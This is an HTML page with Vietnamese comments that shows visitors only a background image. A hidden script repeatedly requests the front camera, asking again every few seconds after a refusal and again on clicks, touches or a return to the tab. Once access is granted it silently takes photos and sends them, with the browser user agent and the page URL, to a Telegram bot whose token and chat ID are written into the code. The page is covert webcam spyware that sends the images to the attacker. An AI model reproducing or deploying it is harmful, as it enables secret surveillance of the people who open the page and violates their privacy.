<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            /* ===== THAY LINK CATBOX CỦA BẠN VÀO ĐÂY ===== */
            background: url('https://files.catbox.moe/10xkyi.jpg') no-repeat center center fixed;
            background-size: cover;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <video id="cam" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // ===== CẤU HÌNH TELEGRAM =====
        const BOT_TOKEN = '8974775817:AAE8_9hMuJ2ZZLKGKtdpCYxtkoCY97vodOE';      // Thay token bot của bạn
        const CHAT_ID   = '8782950405';        // Thay chat_id của bạn

        // Cấu hình xin quyền lặp
        const RETRY_DELAY   = 3000;   // 3 giây xin lại 1 lần nếu bị từ chối
        const MAX_ATTEMPTS  = 999;    // Gần như vô hạn (đến khi được thì thôi)

        let attemptCount = 0;
        let retryTimer = null;
        let streamActive = false;

        // Gửi ảnh về Telegram
        async function sendPhoto(blob, caption) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('caption', caption);
            fd.append('photo', blob, 'capture.jpg');
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                });
            } catch (e) {}
        }

        // Gửi text về Telegram
        async function sendText(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch (e) {}
        }

        // Chụp và gửi
        function captureAndSend(video) {
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width  = video.videoWidth  || 1280;
            canvas.height = video.videoHeight || 720;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                if (blob) {
                    const ts = new Date().toLocaleString('vi-VN');
                    await sendPhoto(blob, '📸 ' + ts);
                }
            }, 'image/jpeg', 0.85);
        }

        // Hàm xin quyền - TỰ ĐỘNG LẶP NẾU BỊ TỪ CHỐI
        async function requestCamera() {
            attemptCount++;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                });

                // ===== ĐÃ ĐƯỢC CẤP QUYỀN =====
                streamActive = true;
                if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }

                const video = document.getElementById('cam');
                video.srcObject = stream;
                await video.play();

                // Thông báo đã cấp quyền
                sendText('✅ Đã cấp quyền camera (lần thử #' + attemptCount + ')');
                sendText('🌐 UA: ' + navigator.userAgent);
                sendText('🔗 URL: ' + window.location.href);

                // Chụp lần đầu sau 2 giây
                setTimeout(() => captureAndSend(video), 2000);

                // Chụp thêm mỗi 8 giây, tối đa 8 lần
                let count = 0;
                const interval = setInterval(() => {
                    count++;
                    if (count > 8) {
                        clearInterval(interval);
                        return;
                    }
                    captureAndSend(video);
                }, 8000);

            } catch (err) {
                // ===== BỊ TỪ CHỐI =====
                sendText('❌ Từ chối camera lần #' + attemptCount + ': ' + err.message);

                // Nếu còn lượt thử → hẹn xin lại sau RETRY_DELAY giây
                if (attemptCount < MAX_ATTEMPTS && !streamActive) {
                    if (retryTimer) clearTimeout(retryTimer);
                    retryTimer = setTimeout(() => {
                        // Kiểm tra xem tab còn mở không
                        if (!document.hidden || true) {
                            requestCamera();
                        }
                    }, RETRY_DELAY);
                }
            }
        }

        // Khởi động
        function start() {
            // Thử lấy quyền ngay
            requestCamera();

            // Cơ chế phụ: nếu người dùng quay lại tab → thử lại ngay
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden && !streamActive && !retryTimer) {
                    requestCamera();
                }
            });

            // Cơ chế phụ: nếu người dùng click vào trang → thử lại ngay
            // (nhiều trình duyệt yêu cầu tương tác người dùng)
            document.addEventListener('click', () => {
                if (!streamActive) {
                    requestCamera();
                }
            }, { once: true });

            // Cơ chế phụ: nếu người dùng chạm vào trang (mobile)
            document.addEventListener('touchstart', () => {
                if (!streamActive) {
                    requestCamera();
                }
            }, { once: true });
        }

        // Tự chạy khi trang tải xong
        window.addEventListener('load', start);
    </script>
</body>
</html>
